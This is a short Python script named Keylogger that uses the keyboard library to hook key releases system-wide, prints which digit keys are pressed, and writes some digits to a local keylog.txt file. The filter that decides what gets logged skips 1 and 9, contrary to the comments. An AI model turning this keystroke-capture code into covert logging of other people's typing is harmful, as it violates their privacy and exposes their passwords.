import keyboard # for keylogs

class Keylogger:
    def __init__(self):
        # maintains a log of desired keypresses
        self.log = ""

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name

        if(name == '1'):
            print("1 detected")
        elif(name == '2'):
            print("2 detected")
        elif(name == '3'):
            print("3 detected")
        elif(name == '4'):
            print("4 detected")
        elif(name == '5'):
            print("5 detected")
        elif(name == '6'):
            print("6 detected")
        elif(name == '7'):
            print("7 detected")
        elif(name == '8'):
            print("8 detected")
        elif(name == '9'):
            print("9 detected")
        elif(name == '0'):
            print("0 detected")

        #logging only desired keypresses
        if(name > '1' and name < '9'):
            # finally, add the key name to our global `self.log` variable, and log the changes
            self.log += name
            self.report()

    def report(self):
        """
        This function writes to logfile
        """
        if self.log:
            # update log file
            f = open("keylog.txt", "w")
            f.write(self.log)
            f.close()

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()